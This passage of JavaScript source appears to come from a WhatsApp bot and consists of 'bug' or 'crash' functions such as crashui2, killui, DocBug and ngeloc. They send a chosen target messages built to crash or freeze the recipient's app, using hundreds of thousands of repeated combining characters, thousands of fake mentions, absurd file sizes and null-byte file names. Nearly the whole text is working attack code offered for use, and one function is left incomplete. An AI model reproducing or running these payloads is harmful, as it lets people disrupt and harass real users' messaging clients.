⃪⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴".repeat(50),
								},
								nativeFlowMessage: {
									messageParamsJson: "{}",
								},
								contextInfo: {
									mentionedJid: ["628888888888@s.whatsapp.net", ...Array.from({
										length: 10000
									}, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "\u0000",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				},
				{
					participant: {
						jid: target
					}
				}
			);
		};
	async function crashui2(target, ptcp = false) {
    await Xlesy.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉ ̷X̷l̷e̷s̷y̷V̷I̷P̷" + "ꦾ".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " xCeZeT " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function IosMJ(target, Ptcp = false) {
      await Xlesy.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉ ̷X̷l̷e̷s̷y̷V̷I̷P̷" + "".repeat(90000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 99999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "Ueheheheeh",
                body: "Kmu Ga Masalah Kan?" + "".repeat(200),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "Https://t.me/GxyenDev",
                mediaUrl: "Https://t.me/GxyenDev",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "Https://t.me/GxyenDev",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbcayCampaignId: "smb_cay_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }

async function crashX(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
 "documentMessage": {
 "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
 "mimetype": "penis",
 "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
 "fileLength": "999999999",
 "pageCount": 999999999,
 "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
 "fileName": `🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉ ̷X̷l̷e̷s̷y̷V̷I̷P̷.xp`+"ྦྷ".repeat(60000),
 "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
 "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
 "mediaKeyTimestamp": "1715880173"
 }
}), { userJid: target, quoted: kuwoted });
await Xlesy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function crashbeta(target, ptcp = false) {
let BetaFc = "🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉ ̷X̷l̷e̷s̷y̷V̷I̷P̷" + "ꦾ".repeat(250000);

const messageContent = {
    ephemeralMessage: {
        message: {
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 0,
                        caption: BetaFc,
                        sequenceNumber: "",
                        jpegThumbnail: null
                    },
                    body: {
                        text: BetaFc
                    },
                    nativeFlowMessage: {}, // If needed, specify more details here
                    contextInfo: {
                     contactVcard: true,
                        mentionedJid: [m.chat],
                        groupMentions: [
                            { 
                                groupJid: "@120363321780343299@g.us", 
                                groupSubject: "Gxyenn nih deck" 
                            }
                        ]
                    }
                }
            }
        }
    }
}
}
async function Bug2(target, ptcp = false) {
    let akumw = "🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉ ̷X̷l̷e̷s̷y̷V̷I̷P̷" + "ꦿꦾ꧀".repeat(50000);
    await Xlesy.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: " TrashDex Explanation ",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: akumw
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function DocBug(target) {
 let virtex = "🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉ ̷X̷l̷e̷s̷y̷V̷I̷P̷";
   Xlesy.relayMessage(target, {
     groupMentionedMessage: {
       message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "99999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉ ̷X̷l̷e̷s̷y̷V̷I̷P̷" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
async function LocaBugs(target) {
 await Xlesy.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: `🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉ ̷X̷l̷e̷s̷y̷V̷I̷P̷`+'ꦾ'.repeat(100000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉ ̷X̷l̷e̷s̷y̷V̷I̷P̷" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function killui(target, Ptcp = true) {
      await Xlesy.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                    fileName: "⿻",
                    fileEncSha256:
                      "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                    directPath:
                      "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1726867151",
                    contactVcard: true,
                    jpegThumbnail: fs.readFileSync("./lib/media/image/Gxyenn.png"),
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "⿻🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉ ̷X̷l̷e̷s̷y̷V̷I̷P̷\n" + "ꦾ".repeat(28000),
                },
                nativeFlowMessage: {
                  messageParamsJson: "{}",
                },
                contextInfo: {
                  mentionedJid: ["6289526156543@s.whatsapp.net"],
                  forwardingScore: 1,
                  isForwarded: true,
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                      fileName: "Дѵөҫдԁө Ԍҵдѵд tђคเlคภ๔",
                      fileEncSha256:
                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                      directPath:
                        "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1724474503",
                      contactVcard: true,
                      thumbnailDirectPath:
                        "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256:
                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256:
                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail: "",
                    },
                  },
                },
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }
    
async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉ ̷X̷l̷e̷s̷y̷V̷I̷P̷`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await Xlesy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
